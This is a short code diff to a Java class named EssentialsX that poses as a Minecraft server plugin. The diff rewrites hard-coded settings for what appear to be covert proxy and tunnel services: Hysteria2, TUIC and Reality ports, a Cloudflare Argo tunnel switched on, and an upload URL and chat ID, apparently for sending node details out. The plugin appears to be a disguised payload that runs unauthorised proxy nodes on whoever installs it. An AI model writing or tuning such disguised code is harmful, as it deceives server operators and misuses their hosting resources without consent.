@@ -82,10 +82,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "32940");
-        env.put("TUIC_PORT", "");
+        env.put("HY2_PORT", "");
+        env.put("TUIC_PORT", "32940");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "32940");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
@@ -93,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "rustix-3");
-        env.put("DISABLE_ARGO", "true");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
